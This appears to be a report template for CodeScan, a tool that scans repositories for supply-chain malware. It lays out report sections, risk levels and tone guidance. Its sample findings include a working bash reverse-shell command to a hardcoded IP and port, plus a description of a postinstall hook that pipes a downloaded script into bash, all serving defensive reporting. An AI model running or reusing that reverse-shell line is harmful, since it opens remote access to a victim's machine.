# Code Scan Report Template

Use this exact structure when composing the report. The report is written as a `.md` file to `./codescan-reports/scan-report-YYYYMMDD-HHMMSS.md` on the host.

Do not omit sections — if a section has no findings, write "None found."

---

## Template

```markdown
# Code Scan Report

| Field | Value |
|---|---|
| **Target** | `<URL or path>` |
| **Scanned** | YYYY-MM-DD HH:MM:SS |
| **Risk Level** | 🔴 CRITICAL / 🟠 HIGH / 🟡 MEDIUM / 🟢 LOW / ✅ SAFE |
| **Files scanned** | N |
| **Secondary URLs inspected** | N |

---

## Summary

<2–4 sentences. State the verdict plainly. What is this repo? What was found?
What is the overall risk? E.g.: "This package contains a postinstall script
that downloads and executes a remote shell script from an unknown domain.
This is a classic supply-chain attack pattern. Do not install.">

---

## Repository Profile

| Field | Value |
|---|---|
| **Language(s)** | Python, JavaScript, … |
| **Entry points** | main.py, index.js, … |
| **Install hooks** | YES — postinstall in package.json / NONE |
| **Binary files** | N (unreadable without decompilation) |
| **Packed/obfuscated** | YES — UPX, base64, … / NO |
| **dep-scan** | ✅ N packages checked (N npm, N PyPI) — N warnings, N blocks / ⚠️ image build failed — see error below |

---

## Findings

### 🔴 [CRITICAL] \<Short title — what it is and where\>

**File:** `path/to/file.ext` (line N)

**Evidence:**
\```
exact code snippet here
\```

**Explains:** The postinstall hook runs automatically on `npm install`. This
downloads an external shell script from a domain with no public presence and
pipes it directly into bash without inspection. Any code the attacker hosts
at that URL will run with the user's full permissions.

---

### 🟠 [HIGH] \<Short title\>

**File:** `path/to/file.ext` (lines N–M)

**Evidence:**
\```
exact code snippet
\```

**Explains:** ...

---

### 🟡 [MEDIUM] \<Short title\>

**File:** `path/to/file.ext` (line N)

**Evidence:**
\```
exact code snippet
\```

**Explains:** ...

---

### 🔵 [INFO] \<Short title\>

**File:** `path/to/file.ext`

**Note:** ...

---

## Dependency Supply Chain Analysis

> dep-scan runs on every scan. Include this section with the results table below. If the image build itself failed (network failure, Docker error), replace the table with:
> "⚠️ **dep-scan image build failed** — dependency supply chain analysis could not run. Error: \<paste docker build error\>. Retry manually: `docker build -t dep-scan:latest -f code-scanner/docker/Dockerfile.dep-scan /path/to/dep-scan`"

| Package | Version | Registry | Age | Flagged Policies |
|---------|---------|----------|-----|------------------|
| `expresss` | 0.0.0 | npm | 84401h | typosquatting (similar to `express`, distance: 0.12) |
| `internal-utils` | 0.1.0 | npm | 891h | dependency_confusion (matches `internal-` prefix) |
| `sketchy-lib` | 1.0.0 | pypi | 12h | age (< 48h), install_scripts (eval in setup.py) |

> Packages that passed all 6 policies (age, install_scripts, typosquatting, vulnerability, maintainer_change, dependency_confusion) are omitted from this table. Only flagged packages are listed.
>
> Any dep-scan finding at `block` level should also appear in the main Findings section above as a HIGH-severity finding with full explanation.

---

## Secondary Payload Analysis

### URL: `https://suspicious-domain.io/setup.sh`

| Field | Value |
|---|---|
| **Status** | Retrieved (2.1 KB, text/plain) |
| **Risk** | 🔴 CRITICAL |

**Findings:**

#### 🔴 [CRITICAL] Reverse shell to hardcoded IP

**Evidence:**
\```bash
bash -i >& /dev/tcp/185.220.101.42/4444 0>&1
\```

**Explains:** Opens an interactive bash shell and redirects stdin/stdout/stderr
to a TCP connection to 185.220.101.42 on port 4444. This gives the attacker
a persistent remote shell with the victim's user permissions.

---

### URL: `https://unreachable-domain.xyz/binary.bin`

| Field | Value |
|---|---|
| **Status** | ⚠️ UNVERIFIED — connection refused |
| **Context** | Referenced in `package.json` postinstall hook |

**Note:** The URL was unreachable at scan time. An inaccessible URL in an
install hook is itself suspicious — the payload may be served selectively
or activated at a later date.

---

## Recommendation

> ### ⛔ DO NOT INSTALL
>
> This repository contains confirmed malicious code. Installing it will
> compromise your system.
>
> **Immediate actions if already installed:**
> - Revoke any AWS/cloud credentials that were accessible during install
> - Check for injected cron jobs: `crontab -l` and `ls /etc/cron.d/`
> - Check for new systemd services: `systemctl list-units --type=service`
> - Check running processes for unexpected connections: `ss -tp`
> - Report to the relevant package registry

---

> ### ⚠️ INSTALL WITH CAUTION
>
> Suspicious patterns were found that require manual review before use.
>
> **Review these before proceeding:**
> - `lib/telemetry.js` lines 34–41 — verify the analytics endpoint is legitimate
> - `scripts/postinstall.sh` — confirm the install script is not making unexpected network calls

---

> ### ✅ LIKELY SAFE
>
> No significant issues found. Minor observations:
> - ...
>
> **Checked:** obfuscation, download-and-execute, supply chain hooks, credential
> harvesting, reverse shells, cryptominer indicators, data exfiltration,
> privilege escalation, N embedded URLs

---

*Generated by [CodeScan](https://github.com/tkdtaylor/CodeScan) v1.4.0*
```

---

## Risk level selection guide

| Level | Emoji | When to use |
|---|---|---|
| **CRITICAL** | 🔴 | Any CRITICAL finding present |
| **HIGH** | 🟠 | Any HIGH finding, no CRITICAL |
| **MEDIUM** | 🟡 | Only MEDIUM findings, no higher |
| **LOW** | 🟢 | Only LOW/INFO findings |
| **SAFE** | ✅ | Zero findings across all categories |

## Tone guidance

- Be direct. "This is malicious" is more useful than "this could potentially be concerning."
- Explain the mechanism — what would actually happen if the code ran?
- Non-technical users should understand the recommendation without reading the findings.
- Technical users should be able to reproduce your findings from the evidence provided.
- The report is the permanent artifact — write it as if the user will share it with their team.
